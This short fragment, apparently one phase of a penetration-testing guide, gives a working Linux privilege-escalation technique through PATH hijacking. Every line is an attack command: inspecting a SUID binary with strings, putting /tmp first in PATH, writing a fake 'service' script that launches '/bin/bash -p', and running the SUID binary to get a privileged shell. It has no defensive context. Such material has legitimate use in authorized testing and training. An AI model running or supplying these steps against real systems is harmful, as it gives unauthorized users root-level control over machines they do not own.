# Phase 8: PATH Hijacking

```bash
# Find SUID binary calling external command
strings /usr/local/bin/suid-binary
# Shows: system("service apache2 start")

# Hijack by creating malicious binary in writable PATH
export PATH=/tmp:$PATH
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/service
chmod +x /tmp/service
/usr/local/bin/suid-binary      # Execute SUID binary
```